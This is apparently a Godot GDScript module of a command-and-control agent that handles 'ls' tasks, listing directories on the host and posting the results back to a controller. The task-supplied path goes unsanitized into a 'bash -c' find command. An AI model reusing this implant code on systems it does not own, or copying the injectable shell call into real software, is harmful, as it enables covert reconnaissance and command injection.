extends Node

var api

const outputFormat = '{\\"is_file\\": %s, \\"permissions\\": {\\"octal\\": \\"%%m\\", \\"gid\\":\\"%%G\\", \\"inode\\":\\"%%i\\", \\"uid\\":\\"%%U\\", \\"selinux\\":\\"%%Z\\", \\"fstype\\":\\"%%F\\"}, \\"name\\": \\"%%f\\", \\"access_time\\": \\"%%AFT%%AH:%%AM:%%AS%%Az\\", \\"modify_time\\": \\"%%AFT%%AH:%%AM:%%AS%%Az\\", \\"size\\": %%s, \\"parent\\": \\"%%h\\"}\\n'

func _ready():
	api = $".".get_parent().get_node("api")


func _on_tasking_ls(task):

	if task.has("command") and task.get("command") == "ls":
		var parameters = parse_json(task.get("parameters"))
		var path = parameters.get("path")
		# var recursive = parameters.get("recursive") == "yes"
		var output = "Listing for: %s" % path
		var status = "error"

		# var files = get_dir_contents(path, false)
		# the issue with the above - permissions...they're missing...so sad...
		var ret = []
		var sep = "/"

		if OS.has_feature("X11"):
			ret = get_linux_ls(path)
			
		if OS.has_feature("Windows"):
			ret = get_windows_ls(path)

			if path.find("/") >= 0:
				sep = "/"
			else:
				sep = "\\"

		if OS.has_feature("OSX"):
			ret = get_osx_ls(path)

		if OS.has_feature("iOS"):
			ret = get_ios_ls(path)

		if OS.has_feature("Android"):
			ret = get_android_ls(path)

		if ret["items"].size() > 0:
			status = "success"

		var ls_response = {
			"task_id": task.get("id"),
			"user_output": output,
			"file_browser": {
				"update_deleted": true,
				"success": false,
				"files": []
			}
		}

		if ret["items"].size() >= 1:
			path = path.rstrip(sep)

			if path == "":
				path = sep

			ls_response["file_browser"]["is_file"] = ret["is_file"]
			ls_response["file_browser"]["permissions"] = ret["tle"].get("permissions")
			ls_response["file_browser"]["name"] = ret["tle"].get("name")
			ls_response["file_browser"]["parent_path"] = path.get_base_dir()
			ls_response["file_browser"]["success"] = status == "success"
			ls_response["file_browser"]["access_time"] = ret["tle"].get("access_time")
			ls_response["file_browser"]["modify_time"] = ret["tle"].get("modify_time")
			ls_response["file_browser"]["size"] = ret["tle"].get("size")

		if ret["items"].size() > 1:
			ls_response["file_browser"]["files"] = ret["items"]

		print("\n\n")
		print(ls_response)
		print("\n\n")

		api.agent_response(
			to_json({
				"action": "post_response",
				"responses": [ls_response],
			})
		)
	else:
		pass
		# TODO: error state

func get_linux_ls_find_result(command):
	var result = []
	var output = []

	if 0 == OS.execute("bash", ["-c", command], true, output, false):

		for fileline in output[0].split('\n'):
			if fileline.length() > 0:
				var entry = parse_json(fileline)

				if typeof(entry) == TYPE_DICTIONARY:
					result.append(entry)

	return result

func get_linux_ls(path):
	var dir = Directory.new()
	var is_file = dir.file_exists(path)
	var result = []
	var tle = false

	# TODO: update to a single call?
	# 	$ find / \
	#   	\( -type f -printf "formats" \) , \
	#       \( -type d -printf "formats" \)

	var directories = get_linux_ls_find_result("find %s %s %s %s %s %s %s %s" % [path, "-maxdepth", "1", "-type", "d", "-printf", "'%s'" % [outputFormat % "false"], "2>/dev/null"])
	var files = get_linux_ls_find_result("find %s %s %s %s %s %s %s %s" % [path, "-maxdepth", "1", "-type", "f", "-printf", "'%s'" % [outputFormat % "true"], "2>/dev/null"])

	if is_file:
		tle = files.pop_front()
	else:
		tle = directories.pop_front()

	result.append_array(directories)
	result.append_array(files)

	return {"is_file": is_file, "tle": tle, "items": result}

func get_windows_ls(_path):
	return []

func get_osx_ls(_path):
	return []

func get_ios_ls(_path):
	return []

func get_android_ls(_path):
	return []


# Thanks: https://godotengine.org/qa/5175/how-to-get-all-the-files-inside-a-folder
func get_dir_contents(rootPath: String, recursive: bool) -> Array:
	var files = []
	var directories = []
	var dir = Directory.new()

	if dir.open(rootPath) == OK:
		dir.list_dir_begin(true, false)
		_add_dir_contents(dir, files, directories, recursive)
	else:
		push_error("An error occurred when trying to access the path.")

	return [files, directories]

# Thanks: https://godotengine.org/qa/5175/how-to-get-all-the-files-inside-a-folder
func _add_dir_contents(dir: Directory, files: Array, directories: Array, recursive: bool):
	var file_name = dir.get_next()

	while (file_name != ""):
		var path = dir.get_current_dir() + "/" + file_name

		if dir.current_is_dir():
			print("Found directory: %s" % path)
			var subDir = Directory.new()
			subDir.open(path)
			subDir.list_dir_begin(true, false)
			directories.append(path)

			if recursive:
				_add_dir_contents(subDir, files, directories, true)
		else:
			print("Found file: %s" % path)
			files.append(path)

		file_name = dir.get_next()

	dir.list_dir_end()
